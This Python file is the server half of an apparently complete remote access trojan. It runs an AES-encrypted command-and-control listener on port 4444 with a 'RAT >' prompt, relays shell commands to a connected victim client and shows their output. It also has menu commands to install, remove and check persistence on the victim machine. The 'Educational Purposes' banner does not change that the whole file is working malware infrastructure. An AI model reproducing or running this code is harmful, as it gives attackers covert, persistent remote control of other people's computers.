#!/usr/bin/env python3
import socket
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class Server:
    def __init__(self, host='0.0.0.0', port=4444, key_hex="CAA7BDEE810FD77698A71D75B0A74607"):
        self.host = host
        self.port = port
        self.key = bytes.fromhex(key_hex)
        self.sock = None
        self.client = None
        
    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        print(f"Listening on {self.host}:{self.port}")
        
    def accept_client(self):
        self.client, addr = self.sock.accept()
        print(f"Client connected from {addr[0]}:{addr[1]}")
        
    def decrypt(self, data):
        if len(data) < 16:
            raise ValueError("Data too short")
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext.decode('utf-8', errors='ignore')
    
    def encrypt(self, data):
        import os
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(data.encode(), AES.block_size))
        return iv + ciphertext
    
    def send(self, data):
        encrypted = self.encrypt(data)
        length = struct.pack('!I', len(encrypted))
        self.client.sendall(length + encrypted)
        
    def receive(self):
        length_data = self.client.recv(4)
        if len(length_data) < 4:
            raise ConnectionError("Client disconnected")
        
        length = struct.unpack('!I', length_data)[0]
        
        if length > 10485760:  # 10MB limit
            raise ValueError("Message too large")
        
        data = b''
        while len(data) < length:
            chunk = self.client.recv(min(4096, length - len(data)))
            if not chunk:
                raise ConnectionError("Connection lost")
            data += chunk
            
        return self.decrypt(data)
    
    def shell(self):
        print("\nInteractive command shell")
        print("=" * 50)
        print("Commands:")
        print("  persist_install  - Install persistence")
        print("  persist_remove   - Remove persistence")
        print("  persist_check    - Check persistence status")
        print("  exit/quit        - Close connection")
        print("=" * 50 + "\n")
        
        while True:
            try:
                cmd = input("RAT > ").strip()
                
                if not cmd:
                    continue
                
                self.send(cmd)
                
                if cmd in ['exit', 'quit']:
                    print("Closing connection...")
                    break
                
                response = self.receive()
                print(f"\n{response}\n")
                
            except KeyboardInterrupt:
                print("\nCaught Ctrl+C, sending exit...")
                try:
                    self.send("exit")
                except:
                    pass
                break
            except Exception as e:
                print(f"Error: {e}")
                break
    
    def close(self):
        if self.client:
            self.client.close()
        if self.sock:
            self.sock.close()

def main():
    import sys
    
    print("=" * 60)
    print("  Remote Command Execution Server (Educational Purposes)")
    print("=" * 60)
    
    if len(sys.argv) < 3:
        print("\nUsage: python3 server.py <PORT> <AES_KEY_HEX>")
        print("Example: python3 server.py 4444 0123456789ABCDEF0123456789ABCDEF\n")
        sys.exit(1)
    
    port = int(sys.argv[1])
    key = sys.argv[2]
    
    if len(key) != 32:
        print("ERROR: AES key must be 32 hex characters (16 bytes)")
        sys.exit(1)
    
    server = Server(port=port, key_hex=key)
    
    try:
        server.start()
        server.accept_client()
        
        init_msg = server.receive()
        print(f"[*] {init_msg}\n")
        
        server.shell()
        
    except KeyboardInterrupt:
        print("\nShutting down...")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    main()
